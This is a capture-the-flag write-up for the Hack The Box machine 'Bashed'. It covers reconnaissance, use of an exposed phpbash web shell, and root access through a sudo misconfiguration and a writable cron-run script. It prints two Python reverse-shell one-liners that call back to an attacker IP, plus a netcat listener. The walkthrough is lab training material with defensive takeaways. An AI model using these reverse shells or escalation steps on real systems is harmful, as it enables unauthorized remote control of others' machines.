---
title: "HTB: Bashed"
tags: [htb, linux, easy, webshell, sudo, python]

description: "A beginner box demonstrating the danger of public web shells and misconfigured sudo permissions."
---

# Hack The Box: Bashed

**Machine IP**: `10.10.10.68`
**OS**: Linux
**Difficulty**: Easy

Bashed is designed to teach you not to leave development tools on production servers. It features a publicly accessible web shell and a classic `sudo` misconfiguration.

---

## 1. Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oA scans/bashed 10.10.10.68
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

### Web Enumeration (Port 80)
The site claims to be a development blog for "phpbash," a web-based terminal.
We run `gobuster` to find hidden directories.

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt
```
**Results**:
*   `/dev` (Code: 200)
*   `/php` (Code: 200)

Visiting `http://10.10.10.68/dev`, we find `phpbash.php`.
Clicking it opens a fully interactive web shell in the browser. We are user `www-data`.

---

## 2. Exploitation (Shell Stabilization)

The web shell is nice, but we want a real reverse shell.

1.  **Listener**: `nc -lvnp 4444`
2.  **Payload**:
    ```bash
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```
    *(Note: Standard bash TCP connections usually fail here; Python is more reliable).*

We catch the shell.
```bash
www-data@bashed:/$ whoami
www-data
```

## 3. Privilege Escalation

We check sudo permissions.
```bash
sudo -l
```
```text
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

We can switch to the `scriptmanager` user without a password.
```bash
sudo -u scriptmanager /bin/bash
```

### Scriptmanager to Root
As `scriptmanager`, we investigate the filesystem. We find a folder owned by us: `/scripts`.
Inside, there is `test.py` and `test.txt`.
*   The `test.txt` file is owned by `root`.
*   It seems `test.py` is being run by a cron job as root every minute.

**Exploit**: Since we own `test.py`, we overwrite it with a reverse shell.

```python
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.14',5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > test.py
```

Wait 1 minute.
**Root Shell obtained on port 5555.**

## Conclusion
*   **User Flag**: `/home/arrexel/user.txt`
*   **Root Flag**: `/root/root.txt`

Never leave web shells like phpbash on a live server. And never let lower-privilege users write to scripts executed by root cron jobs.
